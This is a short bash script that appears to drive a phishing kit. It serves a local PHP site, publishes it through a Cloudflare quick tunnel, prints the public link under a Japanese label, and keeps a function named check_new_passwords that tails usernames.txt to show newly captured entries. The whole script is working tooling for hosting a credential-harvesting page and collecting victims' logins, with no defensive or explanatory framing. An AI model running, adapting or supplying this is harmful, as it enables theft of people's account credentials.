clear
display_banner() {
    echo "******************************************************"
    echo "******************************************************"
}

stop_php_server() {
    kill "$php_server_pid" > /dev/null 2>&1
    exit 0
}

get_tunnel_link() {
    rm -f .cld.log

    cloudflared tunnel --url http://localhost:8080 --logfile .cld.log > /dev/null 2>&1 &
    sleep 3
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
    if [ -z "$cldflr_url" ]; then
        echo "Cloudflare Tunnel link not found in the output."
    else
        echo "発行URL: $cldflr_url"
    fi
}

check_new_passwords() {
    if [ ! -f "usernames.txt" ]; then
        echo "usernames.txt not found."
        stop_php_server
    fi

    prev_line_count=$(wc -l < "usernames.txt")

    while true; do
        sleep 5
        current_line_count=$(wc -l < "usernames.txt")

        if [ $current_line_count -gt $prev_line_count ]; then
            #echo "情報:"
            tail -n +"$((prev_line_count + 1))" "usernames.txt"
            prev_line_count=$current_line_count
        fi
    done
}

trap stop_php_server SIGINT

display_banner

php -S localhost:8080 > /dev/null 2>&1 &
php_server_pid=$!

get_tunnel_link

check_new_passwords &

wait